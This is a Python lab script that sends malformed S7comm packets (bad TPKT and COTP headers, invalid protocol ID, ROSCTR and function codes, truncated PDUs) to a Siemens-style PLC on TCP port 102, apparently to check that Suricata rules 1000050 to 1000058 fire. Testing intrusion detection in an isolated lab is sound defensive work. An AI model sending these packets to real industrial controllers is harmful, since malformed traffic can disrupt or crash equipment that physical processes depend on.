#!/usr/bin/env python3
"""
Lab-only malformed S7comm payloads (TCP/102).

Default (--mode all): gửi lần lượt từng mẫu malformed đại diện theo nhóm
(TPKT/COTP, S7 header, function layer, truncation), có pause giữa các phase
để Suricata ghi alert (s7comm_malformed.rules, sid 1000050--1000058).

WARNING: Authorized isolated lab only.
"""
from __future__ import annotations

import argparse
import socket
import sys
import time

DEFAULT_PLC = "172.16.16.145"
PORT = 102
DEFAULT_PAUSE = 6.0
DEFAULT_REPEATS = 3

# Setup Communication hợp lệ (cùng nguồn attacks/dos/s7comm_dos.py)
SETUP_PDU = bytes.fromhex(
    "0300002402f0803201000005000014"
    "0000f00000010200c0010a02000c0101"
)


def patch_tpkt_version(pdu: bytes, version: int = 0x02) -> bytes:
    b = bytearray(pdu)
    b[0] = version & 0xFF
    return bytes(b)


def patch_tpkt_length(pdu: bytes, length: int) -> bytes:
    b = bytearray(pdu)
    b[2] = (length >> 8) & 0xFF
    b[3] = length & 0xFF
    return bytes(b)


def patch_cotp_dt(pdu: bytes, cotp: bytes = b"\x01\x00\x00") -> bytes:
    b = bytearray(pdu)
    b[4:7] = cotp[:3]
    return bytes(b)


def patch_s7_protocol_id(pdu: bytes, protocol_id: int = 0x31) -> bytes:
    b = bytearray(pdu)
    b[7] = protocol_id & 0xFF
    return bytes(b)


def patch_rosctr(pdu: bytes, rosctr: int = 0xFF) -> bytes:
    b = bytearray(pdu)
    b[8] = rosctr & 0xFF
    return bytes(b)


def patch_job_function(pdu: bytes, func: int = 0xFF) -> bytes:
    b = bytearray(pdu)
    b[17] = func & 0xFF
    return bytes(b)


def truncate_pdu(pdu: bytes, nbytes: int) -> bytes:
    return pdu[:nbytes]


def build_write_var_malformed() -> bytes:
    """Job Write Var (0x05) nhưng PDU quá ngắn — tham số không đủ byte."""
    return bytes.fromhex("0300001402f08032010000050000050005")


# (mode, pdu_builder, description, expected_sids)
PHASES: tuple[tuple[str, bytes, str, tuple[str, ...]], ...] = (
    (
        "tpkt_bad_version",
        patch_tpkt_version(SETUP_PDU, 0x02),
        "Nhom 1: TPKT version != 0x03",
        ("1000050",),
    ),
    (
        "tpkt_len_gt_payload",
        patch_tpkt_length(SETUP_PDU, 0x0100),
        "Nhom 1: TPKT length khai bao lon hon payload TCP",
        ("1000051",),
    ),
    (
        "tpkt_len_lt_payload",
        patch_tpkt_length(SETUP_PDU, 0x0008),
        "Nhom 1: TPKT length khai bao nho hon payload thuc te",
        ("1000058",),
    ),
    (
        "cotp_invalid",
        patch_cotp_dt(SETUP_PDU),
        "Nhom 1: COTP khong phai DT 02 F0 80",
        ("1000056",),
    ),
    (
        "s7_bad_protocol_id",
        patch_s7_protocol_id(SETUP_PDU, 0x31),
        "Nhom 2: S7 Protocol ID != 0x32",
        ("1000052",),
    ),
    (
        "s7_bad_rosctr",
        patch_rosctr(SETUP_PDU, 0xFF),
        "Nhom 2: ROSCTR khong hop le (0xFF)",
        ("1000053",),
    ),
    (
        "job_bad_opcode",
        patch_job_function(SETUP_PDU, 0xFF),
        "Nhom 3: Job function code 0xFF",
        ("1000054",),
    ),
    (
        "write_var_malformed",
        build_write_var_malformed(),
        "Nhom 3: Write Var (0x05) PDU ngan / thieu tham so",
        ("1000057",),
    ),
    (
        "setup_truncated",
        truncate_pdu(SETUP_PDU, 14),
        "Nhom 4: Setup Communication bi cat co (14 byte)",
        ("1000055",),
    ),
)


def send_once(host: str, pdu: bytes, recv_timeout: float = 1.0) -> tuple[bool, str]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((host, PORT))
        s.sendall(pdu)
        try:
            s.settimeout(recv_timeout)
            data = s.recv(4096)
            return True, f"recv {len(data)} bytes" if data else "no response"
        except OSError as e:
            return True, f"no response ({e})"
    except OSError as e:
        return False, str(e)
    finally:
        try:
            s.close()
        except OSError:
            pass


def run_phase(
    host: str,
    mode: str,
    pdu: bytes,
    desc: str,
    expected: tuple[str, ...],
    repeats: int,
) -> int:
    print(f"--- {mode} ---")
    print(f"  {desc}")
    print(f"  PDU ({len(pdu)} B): {pdu.hex()}")
    print(f"  Expected SID: {', '.join(expected)}")
    ok = 0
    for i in range(repeats):
        success, note = send_once(host, pdu)
        status = "OK" if success else "ERR"
        print(f"  [{i + 1}/{repeats}] {status}: {note}")
        if success:
            ok += 1
        time.sleep(0.4)
    return ok


def run_all(host: str, pause: float, repeats: int) -> int:
    print(f"Target: {host}:{PORT}  phases={len(PHASES)}  repeats={repeats}  pause={pause}s")
    print("Suricata: detect/rules/s7comm_malformed.rules (1000050--1000058)\n")
    for idx, (mode, pdu, desc, expected) in enumerate(PHASES):
        run_phase(host, mode, pdu, desc, expected, repeats)
        if idx < len(PHASES) - 1:
            print(f"--- Pause {pause:.0f}s ---\n")
            time.sleep(pause)
    print("\nAll malformed phases finished.")
    return 0


def get_phase(mode: str) -> tuple[bytes, str, tuple[str, ...]]:
    for m, pdu, desc, expected in PHASES:
        if m == mode:
            return pdu, desc, expected
    raise ValueError(f"unknown mode: {mode}")


def main() -> int:
    modes = [m for m, _, _, _ in PHASES]
    parser = argparse.ArgumentParser(
        description="S7comm malformed packet lab — default runs all representative phases",
    )
    parser.add_argument("plc", nargs="?", default=DEFAULT_PLC, help="PLC IP")
    parser.add_argument(
        "--mode",
        choices=("all", *modes),
        default="all",
        help="Malformed variant (default: all phases)",
    )
    parser.add_argument("--pause", type=float, default=DEFAULT_PAUSE, help="Pause between phases")
    parser.add_argument("--repeats", type=int, default=DEFAULT_REPEATS, help="Sends per phase")
    parser.add_argument("--list", action="store_true", help="List phases and exit")
    args = parser.parse_args()

    if args.list:
        for mode, _, desc, sids in PHASES:
            print(f"{mode:22} -> {','.join(sids)}  |  {desc}")
        return 0

    if args.mode == "all":
        return run_all(args.plc, args.pause, args.repeats)

    pdu, desc, expected = get_phase(args.mode)
    run_phase(args.plc, args.mode, pdu, desc, expected, args.repeats)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
